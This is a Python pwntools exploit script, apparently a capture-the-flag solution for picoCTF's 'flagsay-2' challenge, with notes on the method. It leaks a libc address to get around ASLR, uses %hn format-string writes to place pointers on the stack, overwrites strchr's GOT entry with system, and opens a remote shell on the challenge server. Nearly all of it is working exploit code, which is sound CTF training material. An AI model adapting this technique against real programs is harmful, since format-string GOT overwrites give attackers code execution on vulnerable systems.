"""
rule | offset (content)   | points-to | offset (content)
 (1) | %9$p  (0xf6fffbe0) |    ->     | %16$p (0x00000000)
 (2) | %17$p (0xf6fffc74) |    ->     | %53$p (0xf6fffd60)

STRCHR_GOT = 0x8049980
 
we want to have on the stack address for strchr@got.plt.
so we must create it.

first we can use rule-1:
    %39166x %9$hn
to write the 2 lower bytes (0x9980) to %16$p

the we must find address that points to the upper 2 bytes.
we don't have so we must create one.
using rule-2:
    %64352x %17$hn
we can write to the lower 2 bytes of %53$p
so it will point to %9$p+2bytes (0xfbe2)

the we could use rule-1 again:
    %1922x %53$hn
to write the 2 upper bytes (0x0804) to %16$p

now 0x08049980 is in %16$p.
and we can use %16$n to overwrite the address of strchr to system.

beacuse ASLR is enabled:
we must leak the address of strchr in libc to calculate the address of system.
we will add the offset between system and strchr to the leaked address.

luckily, %2$p point to stdin in libc.
so we only have to add the known offset to it.



# /server %2$p

b* 0x80486bf

# 0xfc5c
/server %64474x %17$hn
/server %39166x %53$hn

# 0xfc60
/server %64478x %17$hn
/server %39168x %53$hn
# x/wx 0xf6fffc5c
# x/wx 0xf6fffc60

# 0xcda0 0xf663
/server %52510x %47$hn %10433x %48$hn
# x/wx 0x8049980

# /server sh
# /server ls
"""
from pwn import *

# proc = process('./flagsay-2')
proc = remote('shell2017.picoctf.com', 20431)

def leak_stdin_libc():
    proc.sendline('_|%2$p|_')
    data = proc.recvuntil(' //'+' '*53+'\n')
    data = data[data.index('_|')+len('_|'):]
    data = data[:data.index('|_')]
    return int(data,16)
    
def leak_stack_base():
    proc.sendline('_|%17$p|_')
    data = proc.recvuntil(' //'+' '*53+'\n')
    data = data[data.index('_|')+len('_|'):]
    data = data[:data.index('|_')]
    return int(data,16)-52*4
    
def place_on_stack(address, content):
    proc.sendline('%%%dx %%17$hn' % ((address & 0xffff) - 130))
    proc.recvuntil(' //'+' '*53+'\n')
    proc.sendline('%%%dx %%53$hn' % (content - 130))
    proc.recvuntil(' //'+' '*53+'\n')

def overwrite_got(low_bytes, high_bytes):
    proc.sendline('%%%dx %%47$hn %%%dx %%48$hn' % (low_bytes - 130, high_bytes - low_bytes - 2))
    proc.recvuntil(' //'+' '*53+'\n')
    
# $ readelf -s ./i386-linux-gnu/lib/libc.so.6 | grep _IO_2_1_stdin_
STDIN_LIBC  = 0x1a9c20
# $ readelf -s ./i386-linux-gnu/lib/libc.so.6 | grep system
SYSTEM_LIBC = 0x03e3e0
# $ readelf -r ./flagsay-2 | grep strchr
STRCHR_GOT = 0x8049980

# OFFSET = -1488960
OFFSET      = SYSTEM_LIBC-STDIN_LIBC
STDIN_REAL  = leak_stdin_libc()
SYSTEM_REAL = leak_stdin_libc()+OFFSET

log.info('strchr_got:   %s' % hex(STRCHR_GOT))
log.info('stdin_libc:   %s' % hex(STDIN_REAL))
log.info('system_libc:  %s' % hex(SYSTEM_REAL))

STACK_BASE  = leak_stack_base()
log.info('stack_base:   %s' % hex(STACK_BASE))

place_on_stack(STACK_BASE+4*46 ,(STRCHR_GOT & 0xffff)    )
place_on_stack(STACK_BASE+4*47 ,(STRCHR_GOT & 0xffff) + 2)

SYSTEM_LO   = (SYSTEM_REAL & 0xffff)
SYSTEM_HI   = (SYSTEM_REAL & 0xffff0000) >> 16
overwrite_got(SYSTEM_LO, SYSTEM_HI)

proc.sendline("sh")
proc.interactive()